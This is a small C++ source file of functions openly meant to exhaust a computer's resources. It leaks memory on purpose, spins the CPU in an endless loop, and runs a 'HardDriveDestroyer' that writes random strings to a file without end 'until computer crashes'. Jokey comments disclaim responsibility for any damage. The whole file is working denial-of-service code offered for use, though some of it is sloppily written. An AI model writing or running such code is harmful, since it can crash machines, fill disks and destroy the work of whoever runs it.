///Simple functions that hopefully fills up the computer resources...
///Use this at your own risk, I'm not responsible for any damage you do.

///You would normally use the HardDriveDestroyer function because it does it's purpose very well :D
#ifndef MEM_OVERFL
#define MEM_OVERFL 1
#endif // MEM_OVERFL

#include <iostream>
#include <math.h>
#include <fstream>
#include <cstring>
#include <stdlib.h>
#include <time.h>


//Generate a random string.
std::string RandomString()
{
    //Create a new string with the name str.
    std::string str(" ");
    //Create a random value
    srand(time(NULL));
    int loopz = rand();
    //Generate the string.
    while(loopz)
    {
        str += (char)rand() % 128;
        loopz -=1;
    }
    //Return it.
    return str;
}

//Function definition.
void FillMemory()
{
    uint64_t* a; //Create a 64 bit unsigned pointer.
    a = new uint64_t; //Allocate a new 64bit integer variable in the memory.
    if(a != 0x0)*a = 1; //Use the integer a little because why not?

//Unfortunately program will throw a 0xC0000005 if there's no more remaining memory. :(

//We do not delete the variable after because we actually want memory leaks :D
}
//This wont crash your computer :(

//Doesn't use all the CPU resources :(
void CPUFiller()
{
    int a; //Define a local variable
    while(true)
    {
        a=sqrt(2147483647); //Calculate the square root
        a= sin(a); //Then the sine function xd
    }
}
//Create a file that is getting bigger and bigger while this function runs.
void HardDriveDestroyer(char * filename)
{
    std::ofstream out(filename); //Create a output file stream.
    while(true) //Execute until computer crashes ;)
    {
        //Create a random string
        std::string rnd;
        rnd = RandomString();
        //Write the string to the file
        out << rnd+rnd+rnd+rnd+rnd+rnd+rnd;
        std::cout << rnd; //Show it into the console, for debug purposes.
    }
}
